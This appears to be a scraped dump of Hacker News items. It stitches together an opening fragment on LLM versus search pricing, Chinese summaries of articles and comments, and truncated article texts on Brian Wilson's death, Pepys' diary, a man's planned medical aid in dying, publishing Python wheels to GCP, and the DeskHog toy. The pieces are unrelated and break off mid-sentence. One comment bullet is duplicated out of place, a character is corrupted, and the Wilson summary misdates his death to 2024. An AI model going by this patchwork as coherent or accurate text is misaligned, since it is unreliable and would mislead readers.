If we assume the average query uses 1k tokens, these prices would be
directly comparable to the prices per 1k search queries. That's convenient.
The low end of that spectrum is at least an order of magnitude
cheaper than even the cheapest search API, and even the models at the
low end are pretty capable. The high end is about on par with the
highest end of search pricing. To compare a midrange pair on quality,
the Bing Search vs. a Gemini 2.5 Flash comparison shows the LLM being
1/25th the price.
Note that many of the above models have cheaper pricing in exchange
for more flexible scheduling (Anthropic, Google and OpenAI give a 50%
discount for batch requests, Deepseek is 50%-75% cheaper during off-peak
hours). I've not included those cheaper options in the table to keep
things comparable, but the presence of those cheaper tiers is worth
keeping in mind when thinking about the next section...
Objection!

back-of-the-envelope calculation, and a lot of them

data.title: Show HN: Spark, An advanced 3D Gaussian Splatting renderer for Three.js
data.author: dmarcos
data.article_summary: 这篇文章介绍了一种先进的3D Gaussian Splatting渲染器，可集成到THREE.js场景中，与其它网格和溅点共存。该渲染器支持在所有设备上快速渲染，具备可编程的动态溅点效果，并支持多种格式（如ply、spz、splat、ksplat）。用户可以轻松上手，实现高效的3D视觉效果。
data.comments_summary:
主要讨论点：Gaussian Splatting技术及其应用、性能问题、技术实现细节、以及对该技术未来发展的讨论。

不同观点：
• **对Gaussian Splatting的积极反馈**：
  - erulabs认为该技术在旧款iPhone上运行良好，但对"Gaussian Splatting"的定义不明确，建议在项目文档中增加简单介绍。
  - jasonthorsness对食物扫描演示印象深刻，尤其是牛排三明治的细节，并对该技术在现实中的应用表示好奇。
  - ge96对牛排演示效果感到惊艳，认为达到了吸引人的效果。

• **对技术实现和支持的讨论**：
  - ertucetin提到BabylonJS也支持Gaussian Splatting，并提供了相关文档链接。
  - praveen9920询问是否有计划支持三角形溅射（triangle splats）。

• **对性能的关注**：
  - fidotron对动态场景的性能瓶颈表示关注，特别是粒子模拟场景，并指出摄像机旋转后性能显著提升。
  - socalgal2对Gaussian Splatting文件大小表示担忧，提到需要大量数据流来渲染复杂场景，认为这可能限制其实际应用。

• **对技术未来应用的展望**：
  - 90s_dev提到当前极端现实主义和极简像素艺术两个趋势，认为该项目在极端现实主义方向上具有重要意义。
  - two_handfuls对该技术在VR中的应用表示期待，并询问是否能在网页浏览器中运行。

补充讨论：
• **技术细节和开发工具**：
  - _tqr3分享了自己在R3F（React Three Fiber）中添加着色器的经验，认为数学计算较为繁琐。
  - markisus对演示效果表示赞赏，并猜测项目是否使用了WebGPU。

• **其他**：
  - pvg提供了更明显的代码库链接，方便用户访问。
  - vmesel和feiss对项目发布表示祝贺。

争议焦点：Gaussian Splatting技术在实际应用中的可行性，尤其是文件大小和性能问题，这引起了部分用户的 skepticism（如socalgal2）。同时，也有用户对其未来应用充满期待（如two_handfuls和erulabs）。

data.title: V-JEPA 2 world model and new benchmarks for physical reasoning
data.author: mfiguiere
data.article_summary: 无法获取文章内容
data.comments_summary:
主要讨论点：V-JEPA 2模型的性能、技术细节及其未来发展潜力

不同观点：
• TheAceOfHearts：对V-JEPA 2在全新环境中的65%-80%成功率表示担忧，认为20%的失败率较高。不过，相比旧方法的15%成功率，这确实是一个显著提升。另外，计算和执行时间从4分钟减少到16秒也是一个重要改进。对仅通过图像指定目标的方式表示质疑，但认可论文中提到的未来可能引入语言目标的讨论。

• aew2120：提到Ogma公司在2021年已经实现了类似的技术，采用层次架构和在线学习，但没有规划/优化循环，主要依赖反射机制。这与LeCun的JEPA模型有相似之处。

• siavosh：关注“语义”嵌入如何学习，认为这是主要技术挑战之一。

• fidotron：提出模型是否会重新创造Verlet积分或其他物理启发式方法的疑问，认为结合物体跟踪和物理理解可以测量各种物理量。

• cubefox：支持JEPA的基本理念，认为预测嵌入而非具体标记是动物行为的方式，尤其适用于连续领域如视频和机器人技术。指出预测未来感官数据是动物（包括人类）的自然行为。

data.title: Dolly Parton's Dollywood Express
data.author: FinnKuhn
data.article_summary: 无法获取文章内容
data.comments_summary:
主要讨论点：对Dollywood及其相关事物的多角度评价与讨论

不同观点：
• Cleverwebble和deelowe对Dollywood持积极态度，强调其对社区的贡献（如Imagination Library）和运营的出色（如清洁度、友善的员工、良好的维护）。Cleverwebble特别提到Dollywood对个人成长的影响，而deelowe则对蒸汽火车印象深刻。
• Shortformblog对Gatlinburg地区的交通问题提出批评，指出该地区对汽车的依赖以及公共交通的不足，与Dollywood的良好运营形成对比。
• Hirvi74分享了对火车运营管理人员的个人见闻，并提供了一个相关视频链接，展示了一个私人火车收藏和年度节日。
• Flippyhead和sarchertech讨论了Dollywood Express的乘客量，并与其他铁路系统进行比较，flippyhead认为这种比较虽然不实用但有趣，而sarchertech提供了更多技术细节和个人体验。
• Bombcar和lisper对Dollywood Express与公共交通系统的比较持批评态度，认为这种比较不恰当，因为一个是娱乐设施，另一个是公共交通工具。
• Jonah-archive和throwaway522482提供了关于Dollywood火车的技术细节和个人体验，前者介绍了火车的历史和运行细节，后者分享了当地居民享受Dollywood优惠票价的信息。
• Danans和jancsika从更广泛的社会和经济角度讨论Dollywood和迪士尼对美国公共基础设施和交通的影响，danans认为主题公园的火车优于公共交通系统反映了美国优先事项的问题，jancsika则用幽默的方式指出实际货运列车在美国的优先权问题。

补充讨论：
• Dollywood和Dolly Parton在当地社区的积极影响被多次提及，尤其是其慈善活动和对儿童教育的支持。
• 对Dollywood Express的乘客量与其他铁路系统的比较成为一个讨论焦点，部分人认为这种比较不恰当，因为它们服务的目的和经济模式不同。
• 对Gatlinburg地区交通问题的批评提供了一个与Dollywood良好运营相对立的视角，强调了该地区在公共交通方面的不足。
• 个人经历和见闻分享丰富了对Dollywood体验的多样性，包括技术细节、运营管理以及当地居民享受的优惠。

data.title: The Beach Boys' Brian Wilson Dies at 82
data.author: coloneltcb
data.article_summary: 布莱恩·威尔逊（Brian Wilson），海滩男孩（The Beach Boys）的联合创始人及主要词曲作者，于2024年去世，享年82岁。他生前患有类似痴呆的神经认知障碍。威尔逊在青少年时期与兄弟和朋友组建了乐队，凭借《Surfin' U.S.A.》等歌曲成名。1964年，他因恐慌症退出巡演，专注于制作，推出了实验性专辑《Pet Sounds》，虽初期反响不佳，但后来被视为经典。原计划的续作《Smile》因故未完成，直到2004年才重见天日。威尔逊一生饱受心理健康问题困扰，曾受控于心理学家尤金·兰迪，后通过法律手段摆脱其控制。海滩男孩共发行29张录音室专辑，威尔逊个人也发布了多张专辑，并获得多项荣誉，包括格莱美奖和摇滚名人堂入选。他的逝世令乐坛和全球乐迷深感惋惜。
data.comments_summary:
主要讨论点：对布莱恩·威尔逊（Brian Wilson）及其音乐作品的评价和纪念

不同观点：
• **布莱恩·威尔逊是流行音乐的伟大作曲家**：[gabriel666smith]认为威尔逊是史上最伟大的流行音乐作曲家，甚至将他与巴赫和Bacharach相提并论。他强调威尔逊的音乐在技术上的精湛以及情感上的深度，尤其是在他晚年作品中仍然保持极高的艺术水准。

• **《Pet Sounds》专辑的重新评价**：[alexjplant]提到自己曾经对《Pet Sounds》不以为然，认为人们只是为了显得有品位而假装喜欢，直到成熟后才真正理解并爱上这张专辑。他将这张专辑形容为“proto-emo”并 dressed up in an instrumental psychoedelic doo-wop trenchcoat。

• **布莱恩·威尔逊是海滩男孩的核心**：[jihadjihad]引用丹尼斯·威尔逊的话，认为布莱恩是海滩男孩的灵魂，其他成员只是他的“信使”。这一观点强调了布莱恩在乐队中的核心地位。

• **推荐威尔逊的后期作品**：[andy_xor_andrew]鼓励听众去听威尔逊1988年的同名专辑以及2004年重制的《Smile!》，认为这些作品在音乐性和作曲上都非常出色，值得一听。

• **布莱恩·威尔逊的音乐影响深远**：[JKCalhoun]、[Lammy]、[automathematics]等人分享了威尔逊的音乐对他们个人成长的影响，并对他晚年的复出和广泛认可表示欣慰。

补充讨论：
• **对威尔逊生平的感慨**：[Lammy]提到威尔逊与Eugene Landy的悲剧故事，但庆幸他晚年重获爱戴。其他评论如[telesilla]则直接表达对威尔逊经典作品如《God Only Knows》的喜爱。

• **与其他音乐人的比较**：[nonameiguess]将威尔逊与Trent Reznor进行比较，认为虽然两者都有着独特的艺术风格和隐退倾向，但当今乐坛很难找到类似影响力的年轻音乐人。

• **对具体作品的深入解读**：[scop]对《Wouldn't it be Nice》的歌词进行分析，认为其表面欢快的旋律下隐藏着对理想生活的渴望和失落，展示了威尔逊音乐的深度和复杂性。

争议焦点：
• **《Pet Sounds》的初期评价**：部分听众如[alexjplant]起初对《Pet Sounds》持怀疑态度，认为其受欢迎部分是因为文化资本，直到自己成熟后才真正理解。

• **威尔逊与其他音乐天才的比较**：[nonameiguess]提出当今乐坛缺乏类似威尔逊或Reznor这样有影响力的年轻音乐人，这一观点可能引发对现代音乐和艺术家的广泛讨论。

总结：评论主要围绕布莱恩·威尔逊的音乐才华、作品深度及其对个人和乐坛的影响展开，既有对其伟大成就的高度赞扬，也有对其作品的个人化解读和反思。

Brian Wilson
, the co-founder and primary songwriter of
the Beach Boys
, has died, his family
announced
. While an official cause of death was not disclosed, the beloved musical auteur, who helped pioneer the studio-as-instrument, influencing generations of musicians in pop and beyond, was
revealed
in early 2024 to be living with a neurocognitive disorder akin to dementia. Wilson was 82 years old.
“We are heartbroken to announce that our beloved father Brian Wilson has passed away,” his family wrote in a statement shared on Wilson’s official
Facebook
. “We are at a loss for words right now. Please respect our privacy at this time as our family is grieving. We realize that we are sharing our grief with the world. Love & Mercy.”
Born in Inglewood, California, Wilson formed the band—then called the Pendletones—as a teenager with his brothers Dennis and Carl, their cousin Mike Love, and high school friend Al Jardine. Their first song, “Surfin’,” was released by Candix Records, who changed the band’s name to the Beach Boys without the members’ permission. A year later, the band signed with Capitol to release its debut,
Surfin’ Safari
; the following year, “Surfin’ U.S.A.” became the Beach Boys’ first U.S. Top 10 single. In 1963, the band released three albums:
Surfin’ U.S.A.
,
Surfer Girl
, and
Little Deuce Coupe.
By then, Wilson had started his career as a producer for other musicians. He worked with Jan and Dean, the Castellas, Donna Loren, Sharon Marie, and others.
In 1964, Brian Wilson decided to stop touring with the Beach Boys after experiencing a panic attack due to the band’s heavy schedule. He focused on his production, and in 1965� started work on the landmark experimental pop album
Pet Sounds
. Wilson was the mastermind behind the
Pet Sounds
sessions, working alongside famed studio musicians the Wrecking Crew. At the time of its release,
Pet Sounds
was considered a relative commercial flop and critical failure. In 2004, it was inducted into the Library of Congress’ National Recording Registry due to its cultural, historical, and aesthetic significance.
“I wanted to grow musically, so I experimented,” Wilson told the
Harvard Business Review
in 2016. “I wasn’t the type to sit around and be satisfied with an accomplishment, especially not in the studio. And I had ideas coming into my head all the time. Many had to do with using instruments as voices and voices as instruments. I would put sounds together to create something new. Some ideas didn’t work, because they were too difficult to achieve at the time. But most did. And then I immediately moved to the next thing.”
Wilson planned a follow-up album called
Smile
,
which he described as a “teenage symphony to God,” but it was scrapped after continual delays. After the album’s cancellation in 1967, Wilson’s role in the band receded. In 1968, he entered a psychiatric hospital for treatment. In the years after the release of
Pet Sounds
, Wilson briefly owned and operated a health food store called the Radiant Radish. He continued to work with the band while struggling with drug and alcohol addiction in the ’70s.
After a family intervention into Wilson’s deteriorating mental and physical health, he became embroiled with the controversial psychologist Eugene Landy. Their decades-long treatment later became the subject of a biographical film called
Love & Mercy
. The Beach Boys enjoyed a brief resurgence after their 1977 album
Love You
, but Wilson’s health issues persisted. In 1982, Landy removed him from the band for intensive treatment and exercised increasing control over Wilson’s financial and creative endeavors, prompting Wilson to release his debut solo album in 1988. In 1992, following legal action from Carl Wilson and other members of the Wilson family, Landy’s psychology license was revoked and he received a restraining order from Wilson.
Wilson eventually revisited
Smile,
reworking the archived studio sessions with Darian Sahanaja to bring the once-scrapped project to a live concert. He released
Brian Wilson: Presents Smile
in 2004 to critical acclaim. He continued to release solo work in the 2000s. His last solo album of original material was 2015’s
No Pier Pressure
, which featured contributions from Kacey Musgraves and Zooey Deschanel, while his final solo album of covers was 2021’s
At My Piano
, in which he played a variety of the Beach Boys’ songs on the instrument. He released a
memoir
in 2016, and the following year shared “
Some Sweet Day
,” a previously unreleased song recorded in the 1990s, as well as a new single called “
Run James Run
.”
The Beach Boys went on to record 29 studio albums, 11 live albums, and 75 singles. Wilson and the band were inducted into the Rock & Roll Hall of Fame in 1988. As a solo artist, Wilson
won
two Grammy awards (out of nine nominations), and the Beach Boys were honored in 2001 with a Grammy Lifetime Achievement Award. In 2000, Wilson was inducted into the Songwriters

• **《Pet Sounds》的初期评价**：部分听众如[alexjplant]起初对《Pet Sounds》持怀疑态度，认为其受欢迎部分是因为文化资本，直到自己成熟后才真正理解。

data.title: The Diary of Samuel Pepys
data.author: pepys
data.article_summary: 《塞缪尔·皮普斯日记》于1825年首次出版，迅速走红。日记中对伦敦大火、新假发和首次喝紅茶等生动描述深受读者喜爱。随着多个版本的发行，到19世纪末，该日记已成为英国历史和文学的经典。如今，皮普斯成为博物馆展览和历史小说的焦点，其日记常用于向学生介绍复辟时期的历史，甚至连小学生都知道他埋藏奶酪以防火灾的故事。然而，有关删节内容的传闻也引发了广泛讨论。
data.comments_summary:
主要讨论点：对Samuel Pepys的评价及其日记的相关资源

不同观点：
• [sherr] 认为Pepys对女性的行为极其不当，若在当今可能会被称为“性掠食者”甚至“强奸犯”。他指出，18世纪的社会普遍将女性视为性对象，但有必要揭示Pepys的这一面以呈现更全面的形象。该评论引用了Guy de la Bédoyère的YouTube视频作为参考。
• [dr_dshiv] 通过引用Pepys日记中的具体条目，讨论了17世纪英荷战争中的不文明行为，并对比了英国和荷兰军队在战争中的行为。Pepys在日记中表达了对英国士兵行为的羞愧，而荷兰军队则表现出更高的道德标准。

补充讨论：
• [robin_reala] 提供了Pepys日记的免费电子书资源链接，方便读者获取公共领域的版本。
• [vehemenz] 分享了另一个包含Pepys学术背景的视频资源，其中展示了古版日记。
• [ilamont] 强调了Pepys日记在社会和历史研究中的重要性，尤其是其对17世纪英国的记录，并介绍了Pepys使用的速记法（Tachygraphy）及其历史背景。
• [readthenotes1] 推荐了一个每日发布Pepys日记条目及相关评论的网站，为读者提供了解释和讨论的平台。
• [bediger4000] 和 [dcminter] 提到了特定日记条目的受欢迎程度以及历史上对Pepys日记的审查和编辑问题。[dcminter] 还对比了不同版本的Pepys日记，包括未删减版和被审查的早期版本。

争议焦点：
• Pepys对女性的行为是否应被视为严重的道德问题，以及如何在历史背景下评价这种行为。这涉及到现代价值观与历史人物行为之间的冲突。

其他值得注意的讨论点：
• Pepys日记的不同版本和获取方式，包括公共领域电子书和被审查的版本。
• Pepys日记中记录的历史事件及其对当时社会的观察和反思。
• Pepys使用的速记法及其在历史上的应用。

总体而言，讨论涉及Pepys的个人行为、其日记的历史价值以及日记的不同版本和资源。

44214588.article_content:
Feature
The Hidden Diary of Samuel Pepys
When Samuel Pepys’ diary was first published 200 years ago it was an instant hit, but rumours soon spread about what had been cut and why.
Kate Loveman
| Published in
History Today
Volume 75 Issue 6 June 2025
I
n June 1825 Samuel Pepys’ diary was published for the first time. It was an instant hit. Newspapers were soon full of reviews quoting memorable passages from this secret journal: Pepys’ descriptions of the Great Fire of London, his new wig, and his first ever ‘Cupp of Tee’ were among the favourites. Further editions followed, and by the end of the 19th century the diary was celebrated as a classic of British history and literature. Today, Pepys is the star of museum exhibits and historical novels. Excerpts from his diary are often used to introduce students to the Restoration period and, indeed, to introduce history: across England, six-year-olds following the National Curriculum can tell you about how Pepys buried his expensive cheese to protect it from the fire.

data.title: Medical aid in dying, my health, and so on
data.author: homebrewer
data.article_summary: 本文作者讲述了自己选择“医疗援助死亡”（Medical Aid in Dying）的决策过程及其健康状况的恶化。作者在2021年11月因严重心脏问题入院，被诊断为心力衰竭并接受了心脏搭桥手术。术后恢复不佳，安装了植入式心律转复除颤器（ICD）。然而，ICD多次电击让他饱受痛苦，且心脏问题反复发作。2024年初，他的病情进一步恶化，经历了一次特别痛苦的夜晚，被多次电击。医生建议再次进行心脏消融手术，并预估他可能还有十年寿命。面对不断恶化的健康状况和生活质量，作者决定选择“尊严死亡”，并将于2025年6月13日结束自己的生命。
data.comments_summary:
主要讨论点：医疗援助死亡（aid in dying）及其相关伦理、法律和医疗问题

不同观点：
• **支持医疗援助死亡**：
   - [strongpigeon] 认为医疗援助死亡给了病人对死亡的掌控权，允许他们在生命的最后阶段有尊严地告别，并分享了个人经历，表示这种选择让临终过程更有意义。
   - [hypeatei] 支持辅助自杀，认为即便是非绝症患者也应有权选择，现有的法律是朝正确方向迈出的一步。

• **对医疗援助死亡的质疑**：
   - [daedrdev] 对不愿接受心脏移植的选择表示困惑，认为选择死亡而不是尝试移植可能反映了对干预措施的恐惧，但这种选择似乎不够理性。
   - [j-krieger] 无法理解为什么会对生命如此冷漠，表示如果处于类似情况会竭尽全力活下去。

• **法律和政策的讨论**：
   - [hypeatei] 询问其他州是否有类似俄勒冈州的“尊严死”法律，并对这类法律的普及程度表示关注。
   - [BrandoElFollito] 批评法国等国家缺乏对安乐死的支持，导致人们采取极端手段自杀。

• **技术和医疗设备的讨论**：
   - [jollyllama] 对植入式除颤器的频繁电击表示疑问，认为这可能对患者有负面影响。
   - [gadders] 建议为除颤器增加预警功能，以帮助患者做好心理准备。

• **数据和统计的讨论**：
   - [sandworm101] 引用数据指出，医疗援助死亡在加拿大已成为死亡的重要原因，占所有死亡的4.1%，这一比例高于预期。
   - [scottcha] 对特定症状的发生率和自2021年以来的变化表示关注，希望获得更多数据支持。

补充讨论：
• **个人经历和情感分享**：
   - [A_D_E_P_T] 回应关于德国干细胞治疗的讨论，指出获取德国居留权并非不可能，并给出了一些具体建议。

• **生活质量和治疗选择的权衡**：
   - [BXLE_1-1-BitIs1] 提出问题，即患者愿意承受多少痛苦以延长生命，并比较了不同治疗的时间和效果。

争议焦点：
• 医疗援助死亡的合法性和伦理问题，特别是在不同国家和地区的实施情况和个人选择的权利。
• 对极端医疗干预（如器官移植）的态度和决策过程，反映了对生活质量和生命延续的价值观差异。

44249303.article_content:
Medical Aid in Dying, My Health, and so on
I’ll start at the end, because that’s the most important part.  Later this month, I’m obtaining medical aid in dying AKA death with dignity.  Barring unforeseen circumstances or unexpected changes, my last day on earth will be June 13th, 2025.  Realize that I’m just over 46 years old.  So how the hell did we get here?  I’ve written part of the story in dribs and drabs over the years, so I may as well write up the whole thing.
Late on the night of November 14th, 2021, I went to the local emergency room.  I had a blood pressure of 55/37 and a pulse of 220.  I had a heart attack at some point.  I’m not quite sure when that happened.  They admitted me for a hospital stay.
One of the first things they did was an arteriogram, and they found blockage in one artery.  They thought they would be able to treat it with stent placement during the procedure, but it was too severe for that.  They had a surgeon consult with me about doing an open heart procedure.  It would be a single bypass.  If I refused the procedure, my life expectancy would be about 4 and a half years.  So it seemed reasonable to go ahead with it.
On Thursday, I went in for surgery.  It was miserable, but I survived it.  By Monday afternoon, I had recovered sufficiently to be released from the hospital, so I went home and finished the recovery process there.
During my hospital stay, I was also diagnosed with heart failure with reduced ejection fraction.  My ejection fraction was between 25 and 30 percent.  They told me that they would probably want to place an ICD (implantable cardioverter defibrillator) if my ejection fraction didn’t improve.  It never really did.  The best it got was 30 to 35 percent.  So in February of 2023 I went in for an out patient stay to have a subcutaneous implantable cardioverter defibrillator (SICD) placed.
Fastforward a few months.  I’m sitting in my recliner, eating some plantain chips, when all of a sudden, I got shocked.  I jumped and screamed.  Still, it only happened once, and I’m thinking: this is no big deal.  A few weeks later, in August, I received another shock.  It only happened once, so again, I’m like “no big deal.”
On September 11th, the situation changed.  I felt “off” all evening.  I was shocked once, and I kept feeling like another one was coming.  So I went to the ER.  My ICD device fired while I was on the ambulance and when I was being wheeled into the ER.  They kept me for a couple days, ran some tests, told me to follow up with cardiology, and sent me home.
A week later, I was back in the ER with the same complaint.  I don’t remember whether there were multiple shocks.  The same thing happened: they kept me for a couple days to make sure I was stable, ran some tests, sent me home, and told me to follow up with cardiology.
On the first Friday of October, I kept feeling “off”, as though I was going to have a heart episode.  The device didn’t fire, but I went to the ER anyway.  When I was in the ambulance, they told me that I was in VTac (ventricular tachycardia), and they shocked me.  I was shocked several times by hospital staff while they tried to get me stable.  This time was a little different.  The cardiac electrophysiologist decided that it was time to do a cardiac ablation.  They performed that procedure on the following Monday or Tuesday, and I went home in the middle of the week.
Things seemed ok for the next couple of months.  Then, on the night of February 1, 2024, I started receiving more shocks from the ICD.  I went back to the ER.  That night, my ICD shocked me at least seventeen times, and I was also shocked several additional times by paramedics and ER staff.  If you’ve ever taken a physical beating that has left you sore for days, you know exactly what I went through that night.  I took a beating or two of that sort when I was younger, and that’s exactly how being shocked more than twenty times felt.  Every movement of my upper body hurt for the next several days, including just shifting around in bed.  The day after I landed in the emergency room, they sent me to a much larger university hospital in Portland.  That hospital stabilized me, switched out my ICD for another device, and sent me home a couple days later.
I spent the next few months in a state of total mental paralysis that I suspect was some kind of PTSD.  I kept feeling like I was going to have heart episodes and waiting for the next shock.  The new device they placed when I was in Portland had some pacing functionality, so I’m pretty sure I avoided some shocks.  When I saw my cardiologist in the summer of 2024, she told me that the pacing functionality barely succeeded keeping me out of a round of shocks.  She and her boss wanted to do another cardiac ablation.
At this point, I started wondering just how much life I had left.  I bluntly asked for an estimation of my life expectancy and was told maybe ten years with the ablation and the defibrillator.  The point of the ablation wa

data.article_summary:
本文介绍了如何使用Poetry构建Python项目的可运行文件（wheel文件），并将其集成到CI/CD流水线中，最终在GCP虚拟机上运行。由于项目需要直接与GPU驱动交互，不能使用Docker，因此作者选择创建wheel文件。具体步骤包括：

1. 使用Poetry配置`pyproject.toml`文件，指定要打包的目录。
2. 在GCP的Artifact Registry中创建Python仓库，用于存储wheel文件。
3. 配置Poetry的`poetry.toml`文件，指定自定义仓库地址。
4. 动态更新`pyproject.toml`中的版本号，以避免覆盖已发布的版本。
5. 配置VM实例的权限和`pip`设置，以从Artifact Registry下载wheel文件。
6. 使用`pip install`安装项目并运行。

最终，通过这种方式实现了类似Docker工作流的构建、发布和运行流程，满足了直接与GPU驱动交互的需求。

主要讨论点：Python项目的分发和部署方式，特别是在不使用Docker的情况下如何处理，以及关于使用不同注册中心发布Python包的讨论。

不同观点：
• [sergiolema] 认为不需要Docker镜像，而是需要一个可以直接在机器上运行并与GPU驱动交互的可执行文件。他选择使用Poetry来创建Python wheel文件，并将其集成到CI/CD流水线中。他的主要论据是需要直接与硬件交互，Docker引入的抽象层不适用。

• [seanp2k2] 支持不把所有东西都放进容器的观点，认为将一切容器化似乎已经成为默认选择是不幸的。他暗示有时使用Docker可能是不必要的，应该有更多选择。

• [westurner] 提到GCP Artifact Registry作为一个OCI容器镜像注册中心，并指出GitHub上有Actions可以用来将容器镜像推送到GCP Artifact Registry。虽然对于纯Python包可能不必要，但提到"pypa/cibuildwheel"是CI中构建多平台Python包的简便方法。他还提到SLSA.dev和Sigstore，GitHub支持的工件证明和存储OCI镜像库，并提出GCP Artifact Registry是否支持证明的问题。

• [joshdavham] 提出了关于发布Python包的注册中心选择问题，询问有多少人除了PyPI之外还发布到其他注册中心。他个人只使用过PyPI。

补充讨论：
• [westurner] 提供的链接和提到的技术（如GCP Artifact Registry、GitHub Actions、SLSA.dev、Sigstore）展示了在CI/CD中处理Python包和容器镜像的更多技术选择和安全性考虑。

• 争议焦点在于是否所有项目都需要容器化。一方认为Docker等容器化是过度抽象，另一方则讨论了容器在某些场景下的必要性和优势。

• 关于发布Python包的注册中心选择，[joshdavham] 的提问引发了对其他注册中心的潜在需求和使用场景的思考。

44222074.article_content:
Recently, I’ve been building a project in Python that doesn’t have a Docker image as output. Instead, I need a runnable file. Why? Because I need to talk to the machine directly and not to Docker. Because I need to talk to the GPU drivers directly and not to another abstraction layer.
So, I needed to create a runnable file in Python. I needed to create a wheel file. All this with
Poetry
and integrate it into my CI/CD pipeline.
Let’s break down the steps.
Building the Project With Poetry
My first solution was, when an VM is created in my
Compute Instance Group
, I clone the git project, install Poetry, sync the project and run it. Just like in my laptop.
But! I need a token to clone the project. I never liked this solution. So, I’ve been thinking around for an alternative.
I wanted a solution near to the Docker workflow: build locally, push to a registry, and download the latest version at the startup. I searched a way to do the same with a python project. here come the wheel files.
By default, I build my project with
poetry sync
, because I don’t need a runnable file as I mainly use Docker images. But Poetry allows me to configure the
install
command a little bit further. Let’s start configuring that command to build a wheel file.
Here is an extract of the
pyproject.toml
file:
[tool.poetry]
# ...
packages = [
{ include = "main_dir" },
]
It indicates to Poetry to include the main_dir directory when building a package, when building a wheel. Now the
poetry build
command does not require the
no-root
parameter anymore. And the wheel file will be available in the
dist
folder.
Create a Python Registry to Store My Wheel File
The project is hosted in GCP. And GCP has an
artifact registry
that allows me to specify which type of files I want to save there: Docker images, Python Wheel files, Java JAR files…
Once the artifact registry is created, I need to configure two things: Poetry to push to the adequate place, and the VM to pull from the correct place.
Let’s start in the Poetry side. Poetry has another configuration file,
poetry.toml
, which is optional and accepts this kind of configuration:
[repositories.my-registry]
url = "https://europe-west1-python.pkg.dev/my-project/my-registry/"
Now, after building my Poetry project, I can publish to the registry. How?
poetry publish --build --repository my-registry
But! (Yes, another but) I need to remove the
dist
folder, which is the default output folder to build the wheel file. Otherwise, it will ask if I want to override the existing files. and until now, there is no option to force a “yes, override the files, go ahead”.
rm -fr dist/
poetry publish --build --repository my-registry
But! (let’s continue with the buts) Each version I publish will have the version number set in the
pyproject.toml
file. Overriding versioned files is never a good practice. So, I must use a dynamic version number in my
pyproject.toml
file.
sed -I.back 's/^version = "[^"]*"/version = "1.0.post'"$(date +%Y%m%d%H%M)"'"/' pyproject.toml
rm -fr dist/
poetry publish --build --repository my-registry
That’s all on the side of publication. What about pulling the file?
As I’m in a VM running in GCP, and the artifact registry is also in GCP, I must add the adequate permissions to do the operation.
Once, configured all the IAM stuff, I need to run the following command in the VM (it will help me for the next steps).
gcloud artifacts print-settings python --project=my-gcp-project \
--repository=my-registry \
--location=europe-west1
This will print all the configuration I need to put into my VM instance. It will look something like this:
cat > $HOME/.pypirc<< EOF
[distutils]
index-servers =
my-registry
[my-registry]
repository: https://europe-west1-python.pkg.dev/my-gcp-project/my-registry/
EOF
mkdir $HOME/.pip
cat > $HOME/.pip/pip.conf<< EOF
[global]
extra-index-url = https://europe-west1-python.pkg.dev/my-gcp-registry/my-registry/simple/
EOF
Ok, now both my CI/CD and my VM instance are ready to send a Python wheel file from one to the other.
Download a Python Wheel file and Run It
Once the file is available in the GCP Artifact Registry, I need to pull it and run it. It’s quite simple now.
pip install my-project
This first command will install in the machine (no need of Poetry in the production instance) my project.
pip
will look for the latest version of
my-project
into both the pip repository and into the extra index
my-registry
.
In my case, I’ve added my-registry as an extra index. Why? Because my project needs a lot of dependencies (Flask, SQLAlchemy, Pandas…), and I don’t want to store all of them into my GCP Artifact Registry (and pay for that). So, I let
pip
download what’s available in the public registry, and add an extra registry where to look for the other libraries (which is my project).
Once the project is downloaded, I can run it simply as a Python project.
python -m my_job
I have this command because my root module is called
my_job
and I have a
__main__
file which is the starting point of

data.title: DeskHog, an open-source developer toy
data.author: constantinum
data.article_summary: DeskHog是一款开源、3D打印、手掌大小的开发者玩具，内置ESP32-S3处理器、240x135彩色TFT显示屏、WiFi和LED，拥有10小时电池续航。它可以运行简单游戏如Pong和Flappy Bird，并支持I²C扩展端口。DeskHog不仅是微型游戏机，还能作为桌面终端查看PostHog数据，具备实用商业工具如尴尬避免器和Pomodoro计时器。DIY版本现已推出，完整套件即将发布。未来可能推出DeskHog Pro及配件，如更多按钮和表带。用户可在其开源平台上自行开发游戏和工具。
data.comments_summary:
主要讨论点：软件公司进入硬件领域及其产品创新

不同观点：
• **硬件创新来自软件公司**：seveibar认为，硬件创新将越来越多地由软件公司推动，而不是传统的硬件公司。这是因为硬件工具的改进和开源解决方案的普及，使得软件公司能够更容易进行硬件实验并推出实际产品。
• **硬件产品的实用性**：socalgal2分享了自己对某款便宜硬件产品的体验，虽然产品价格低廉，但由于需要自行修改固件和编写程序，使用门槛较高，最终放弃深入研究。这表明便宜硬件在易用性上仍有不足。
• **屏幕大小影响使用体验**：jasperry指出，1.14英寸的屏幕对于中年人来说不太友好，影响使用体验。这反映出部分用户对硬件产品设计细节（如屏幕尺寸）有较高要求。
• **硬件性能限制**：mananaysiempre讨论了某款硬件是否能运行Doom游戏，提出了存储限制的问题，尽管计算能力可能足够。这展示了用户对硬件性能的关注以及对突破性能限制的期待。
• **品牌和营销质疑**：teraflop对该硬件产品的营销方式提出质疑，认为该产品本质上只是将现成的开发板放入塑料外壳中，而营销上却试图强调创新。这反映了部分用户对产品实际创新程度和品牌营销的怀疑。

补充讨论：
• **替代方案的考虑**：newman314提到是否可以使用其他设备（如Flipper）来替代该硬件产品，表明用户在选择硬件产品时会考虑多种选项。
• **产品命名和品牌幽默感**：rideontime和kreetx对产品的命名和网站上的幽默元素（如cookie banner）表示了兴趣和赞赏，说明品牌的幽默感和命名在用户体验中也起到了一定作用。
• **公司文化和吸引力**：joshdavham、kamranjon和bradleykingz等人讨论了Posthog作为一家软件公司为何要制造硬件，并表达了对该公司文化的兴趣和认可，显示出用户对公司文化和品牌吸引力的关注。

争议焦点：
• **硬件产品的实际创新性**：部分用户（如teraflop）质疑该产品的创新性，认为其只是将现有技术重新包装，而其他用户（如seveibar和sibeliuss）则对其创新性和公司成就表示认可和支持。

44247501.article_content:
DeskHog
It's a developer
toy
that brings developers
joy
Full kits coming soon. DIY version available now.
Get the DIY version
Join the kit waitlist
DeskHog is an
open-source,
3D printed,
palm-sized
slice of developer joy
Open-source
We're open-source, and so is DeskHog. It's yours to hack. Build your own games and tools with AI editors (or C++ if you're a masochist).
3D printed
Danilo prints these at home and assembles them by hand. It's a friction-fit labor of love. Or you can print your own from the files on GitHub.
Palm-sized
DeskHog is small enough to fit in your pocket. It's got a 10-hour battery life, WiFi, and a cute flashing LED so you can find it in the dark.
But what is DeskHog really?
It's a teeny, tiny, beast.
